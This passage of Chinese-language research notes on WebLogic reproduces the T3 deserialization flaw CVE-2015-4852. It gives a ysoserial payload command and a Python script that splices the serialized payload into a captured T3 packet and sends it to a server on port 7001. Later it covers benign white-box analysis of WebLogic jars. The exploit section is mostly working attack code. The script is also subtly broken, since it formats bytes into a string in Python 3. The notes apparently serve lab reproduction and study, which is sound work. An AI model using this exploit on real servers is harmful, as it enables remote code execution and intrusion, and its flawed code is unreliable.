headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
headers_bytes = headers.encode('utf-8')
print( 'sending ')
sock.sendall(headers_bytes)


data = sock.recv(1024)
print ( 'received "%s"' % data)

# the evil obj can be sent if the vulnerability exists
...
```

![image-20230714003921173](.\images\image-20230714003921173-16902137501053.png)



**具体攻击方式**

对t3数据包进行进一步分析

- 每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
- 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
- 每个数据包上面都包含了一个T3协议头，发现前面四个字节是数据包长度

![img](.\images\t010438efe9d5afaa18.png)

攻击思路：数据包中包含多个序列化的对象，可以尝试构造恶意对象并替换其中的一个序列化对象，然后封装到数据包中重新发送

![img](.\images\t01930ddfbdb4fc2f6a.png)

CVE-2015-4852漏洞复现 （t3反序列化漏洞）

```
java -jar ysoserial.jar CommonsCollections1 'touch /test.txt' > payload.bin
```

python攻击脚本

```python
import socket
import struct
import sys
from scapy.all import *

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ("192.168.0.102", 7001)
print ('connecting to ')
sock.connect(server_address)

# Send headers
headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
headers_bytes = headers.encode('utf-8')
print( 'sending ')
sock.sendall(headers_bytes)


data = sock.recv(1024)
print ( 'received "%s"' % data)

######################################以下是具体的攻击部分#####################################

# 传入一个文件名，在本例中为刚刚生成的
payloadObj = open("payload.bin",'rb').read()

# 读取 .pcap 文件
packets = rdpcap('t3.pcap')

# 然后可以通过索引访问单个数据包
# 这里获取第一个数据包（索引为 0）
origin_packet = packets[0]

# 如果数据包的负载是你需要的部分，你可以这样获取
payload = origin_packet[Raw].load

# 截取整个payload 的一部分，从24到155
payload_head = payload[23:155]

# 复制剩余数据包，从408到1564
payload_tail=payload[408:1564]

#重新组成payload
payload=payload_head+payloadObj+payload_tail

# 重新计算数据包大小并替换原数据包中的前四个字节
payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])

print('sending payload...')
sock.send(payload)
```

![image-20230725015601524](.\images\image-20230725015601524.png)





### 白盒测试方法

尝试白盒测试，weblogic的服务器逻辑代码主要存储在D:\Oracle\Middleware\Oracle_Home\wlserver\server\lib和D:\Oracle\Middleware\Oracle_Home\wlserver\modules目录下，将这两个目录复制出来，然后用7-zip对目录下所有jar包进行解压，执行以下命令

```
for /R "D:\security\findclass\lib" %i in (*.jar) do "D:\security\7-Zip\7z.exe" x "%i" -o"D:\security\findclass\extract\%~nI" -y

for /R "D:\security\findclass\modules" %i in (*.jar) do "D:\security\7-Zip\7z.exe" x "%i" -o"D:\security\findclass\extract\%~nI" -y
```

然后使用filelocator去对D:\security\findclass\extract目录搜索关键字，尝试定位rest api的处理逻辑

对于rest api：127.0.0.1:7001/management/weblogic/latest/edit/serverTemplateCreateForm，搜索serverTemplateCreateForm，但没有结果

![image-20230716230942127](.\images\image-20230716230942127.png)



搜索latest关键字，几乎所有api都使用latest这个字符表示版本，可以搜到结果，但是结果太多，找其中可能性大的进一步分析

![image-20230716231729994](.\images\image-20230716231729994.png)



在调试过程中发现，在D:\Oracle\Middleware\Oracle_Home\oracle_common\modules目录下，还有部分weblogic相关的代码，也就是，最新版weblogic（14.1.1.0）的需要加载的代码，与之前发生了变化，尤其是与rest api相关的内容，很多都出现在该目录下，weblogic的rest api实现部分很多都依赖于jersey库，该库也位于这个目录下



不过即使在加载了这三个文件夹的情况下，在调试过程中仍然会有极少数逻辑显示本地没有相应代码，最保险的方式还是直接搜索weblogic文件夹下的所有jar文件，然后放在一个文件夹中，作为依赖库导入项目中

